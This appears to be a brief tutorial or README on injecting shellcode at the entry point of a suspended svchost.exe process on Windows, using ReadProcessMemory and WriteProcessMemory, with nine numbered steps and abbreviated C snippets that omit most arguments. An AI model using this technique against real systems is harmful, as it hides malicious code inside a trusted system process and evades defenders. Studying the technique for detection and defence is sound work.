# Theory
> Responders should not rush to kick an attacker out before theyâ€™ve got
> the full picture of what they were looking at and what has been exfiltrated
### Windows API Functions
<p>There has always been many ways to write memory to a process, but achieving it is much harder.</p>
<p>We want to strategically read a process memory, and write specifically to the executable portion.</p>
<p>We will use the following to do so.</p>

```c
ReadProcessMemory() && WriteProcessMemory();
```

### Process
<html>
<p><b>Step 1.</b> Define the structure of the process we want to read.</p>
<p><b>Step 2.</b> Start the process in a suspended state.</p>
<p><b>Step 3.</b> Grab the process environment block.</p>
<p><b>Step 4.</b> Read this structure, grab the base address.</p>
<p><b>Step 5.</b> Read the next 64 bytes, grab the DOS header.</p>
<p><b>Step 6.</b> Read the DOS header, grab PE header.</p>
<p><b>Step 7.</b> Read PE header, and FINALLY grab <span style="color: red;">address of entry</span>.</p>
<p><b>Step 8.</b> Write our shellcode to the executable portion of code.</p>
<p><b>Step 9.</b> Resume process, clean up.</p>
</html>

### Action
```c
// 1 DEFINE STRUCTURES
STARTUPINFOW si;
PROCESS_INFORMATION pi;
CONTEXT context;
SIZE_T dwRead = 0;
IMAGE_DOS_HEADER dosHeader;
IMAGE_NT_HEADERS peHeader;
ULONG_PTR pBaseAddress = 0;
SIZE_T numBytesWritten = 0;
context.ContextFlags = CONTEXT_FULL;
```
```c
// 2 START PROCESS SUSPENDED
CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED);
```
```c
// 3 GRAB ENV BLOCK
GetThreadContext(pi.hThread);
```
```c
// 4 GRAB BASE ADDRESS
ReadProcessMemory(pi.hProcess, &pBaseAddress);
```
```c
// 5 GRAB DOS HEADER
ReadProcessMemory(pi.hProcess, &dosHeader);
```
```c
// 6 GRABE PE HEADER
ReadProcessMemory(pi.hProcess, &peHeader);
```
```c
// 7 GRAB ADDRESS OF ENTRY
LPVOID entryPoint = (LPVOID)((BYTE*)pBaseAddress + peHeader.OptionalHeader.AddressOfEntryPoint);
```
```c
// 8 WRITE SHELLCODE TO ADDRESS
WriteProcessMemory(pi.hProcess, entryPoint)
```
```c
// 9 RESUME PROCESS
ResumeThread(pi.hThread);
```
